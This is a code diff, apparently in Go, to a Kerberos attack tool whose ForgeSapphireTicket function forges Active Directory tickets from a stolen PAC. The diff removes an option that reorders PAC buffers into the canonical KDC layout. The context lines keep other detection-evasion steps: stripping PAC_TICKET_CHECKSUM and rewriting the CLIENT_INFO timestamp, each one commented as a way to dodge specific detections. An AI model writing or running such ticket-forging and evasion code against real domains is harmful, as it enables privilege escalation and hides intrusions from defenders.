@@ -205,13 +205,6 @@ type SapphireTicketRequest struct {
 	// strict KB5008380 enforcement mode may reject tickets lacking this buffer.
 	StripTicketChecksum bool
 
-	// NormalizeBufferOrder reorders PAC buffers to match the canonical KDC-native
-	// layout (LOGON_INFO, CLIENT_INFO, UPN_DNS, SERVER_CHECKSUM, KDC_CHECKSUM,
-	// TICKET_CHECKSUM, FULL_CHECKSUM, ATTRIBUTES_INFO, REQUESTOR_SID). Goobeus's
-	// AddKB5008380Buffers inserts new buffers in a non-canonical order; detections
-	// that check layout ordering as a secondary IOC would flag the difference.
-	NormalizeBufferOrder bool
-
 	// SyncClientInfoTime rewrites CLIENT_INFO.ClientId FILETIME to match the
 	// forged TGT's AuthTime. Legit TGTs have these equal; sapphire inherits
 	// the S4U2Self issuance time instead. Consistency-check detections flag this.
@@ -542,20 +535,6 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			fmt.Printf("[+] Removed PAC_TICKET_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
 		} else {
 			fmt.Println("[!] No PAC_TICKET_CHECKSUM buffer present")
-		}
-	}
-
-	// Step 3.80: Optionally reorder PAC buffers to canonical KDC-native layout.
-	// Must run after all strip/add operations so reordering covers the final
-	// set of buffers. Must run BEFORE re-signing.
-	if req.NormalizeBufferOrder {
-		fmt.Println("[*] Step 3.80: Reordering PAC buffers to canonical KDC-native layout...")
-		var n int
-		stolenPAC, n = pac.NormalizePACBufferOrder(stolenPAC)
-		if n > 0 {
-			fmt.Println("[+] PAC buffers reordered")
-		} else {
-			fmt.Println("[=] PAC buffers already in canonical order")
 		}
 	}
 
